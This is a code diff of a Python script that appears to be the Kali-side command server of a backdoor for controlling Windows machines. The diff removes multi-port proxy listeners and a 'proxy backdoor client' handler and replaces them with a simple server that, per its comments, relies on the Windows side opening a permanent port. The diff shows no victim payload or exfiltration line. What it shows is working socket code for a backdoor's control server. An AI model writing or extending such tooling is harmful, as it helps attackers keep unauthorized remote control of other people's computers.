@@ -12,7 +12,7 @@ import select  # For handling multiple sockets
 import time  # For timing operations
 
 # Import configuration
-from configuration import SERVER_IP, SERVER_PORT, PROXY_PORT_START, PROXY_PORT_END
+from configuration import SERVER_IP, SERVER_PORT
 
 
 # Function to send data reliably as JSON-encoded strings
@@ -447,118 +447,17 @@ def start_multi_connection_server():
     finally:
         sock.close()
 
-def start_port_separated_servers():
-    """Start both main and proxy servers with port separation"""
-    print("[+] Starting Port-Separated Server Architecture")
+def start_simple_server():
+    """Start simple server - no proxy servers needed on Kali side"""
+    print("[+] Starting Simple Server Architecture")
     print(f"[+] Main Server: {SERVER_IP}:{SERVER_PORT}")
-    print(f"[+] Proxy Servers: {SERVER_IP}:{PROXY_PORT_START}-{PROXY_PORT_END}")
-    
-    # Start proxy servers in background thread
-    proxy_thread = threading.Thread(target=start_proxy_servers, daemon=True)
-    proxy_thread.start()
+    print(f"[+] Proxy: Windows opens permanent port directly (no Kali proxy needed)")
     
     # Start main server (blocking)
     start_main_server()
 
-def start_proxy_servers():
-    """Start proxy servers on ports 5556-5565"""
-    proxy_servers = []
-    
-    for port in range(PROXY_PORT_START, PROXY_PORT_END + 1):
-        try:
-            # Create proxy server socket
-            proxy_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            proxy_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            proxy_sock.bind((SERVER_IP, port))
-            proxy_sock.listen(1)  # Each proxy port handles one connection
-            
-            proxy_servers.append((proxy_sock, port))
-            print(f'[+] Proxy Server Ready on {SERVER_IP}:{port}')
-            
-        except Exception as e:
-            print(f'[!] Failed to bind proxy port {port}: {e}')
-            continue
-    
-    print(f'[+] {len(proxy_servers)} Proxy Servers Ready')
-    
-    # Handle proxy connections
-    try:
-        while True:
-            # Check all proxy sockets for connections
-            ready_sockets = [sock for sock, port in proxy_servers]
-            
-            if ready_sockets:
-                ready, _, _ = select.select(ready_sockets, [], [], 1.0)
-                
-                for ready_sock in ready:
-                    # Find which port this socket belongs to
-                    for proxy_sock, port in proxy_servers:
-                        if proxy_sock == ready_sock:
-                            try:
-                                client_socket, client_address = proxy_sock.accept()
-                                print(f'[+] Proxy Client Connected on Port {port}: {client_address}')
-                                
-                                # Handle proxy client in separate thread
-                                proxy_thread = threading.Thread(
-                                    target=handle_proxy_backdoor_client,
-                                    args=(client_socket, client_address, port),
-                                    daemon=True
-                                )
-                                proxy_thread.start()
-                                
-                            except Exception as e:
-                                print(f'[!] Error accepting proxy connection on port {port}: {e}')
-            
-            time.sleep(0.1)  # Small delay to prevent busy waiting
-                
-    except KeyboardInterrupt:
-        print("\\n[!] Proxy servers shutting down...")
-    finally:
-        for proxy_sock, port in proxy_servers:
-            proxy_sock.close()
-
-def handle_proxy_backdoor_client(client_socket, client_address, port):
-    """Handle proxy backdoor client connection"""
-    client_id = f"{client_address[0]}:{client_address[1]} (Port {port})"
-    print(f'[PROXY-{port}] Backdoor session started for {client_id}')
-    
-    try:
-        # Create reliable send/recv functions for this client
-        def client_reliable_send(data):
-            jsondata = json.dumps(data)
-            client_socket.send(jsondata.encode())
-        
-        def client_reliable_recv():
-            data = ''
-            while True:
-                try:
-                    data = data + client_socket.recv(1024).decode().rstrip()
-                    return json.loads(data)
-                except ValueError:
-                    continue
-        
-        # Handle client commands automatically (non-interactive)
-        while True:
-            try:
-                # Wait for command from client
-                command = client_reliable_recv()
-                print(f'[PROXY-{port}] Command from {client_id}: {command}')
-                
-                if command == 'quit':
-                    break
-                
-                # Send response back to client
-                client_reliable_send(f"Command '{command}' received on port {port}")
-                    
-            except Exception as e:
-                print(f'[PROXY-{port}] Command error: {e}')
-                break
-                
-    except Exception as e:
-        print(f'[PROXY-{port}] Client error: {e}')
-    finally:
-        client_socket.close()
-        print(f'[PROXY-{port}] Client Disconnected: {client_id}')
+# Removed complex proxy server functions - not needed for simple approach
+# Windows opens permanent port directly, no Kali proxy servers required
 
 def start_main_server():
     """Start main backdoor server on port 5555"""
@@ -588,4 +487,4 @@ def start_main_server():
         sock.close()
 
 if __name__ == "__main__":
-    start_port_separated_servers()
+    start_simple_server()
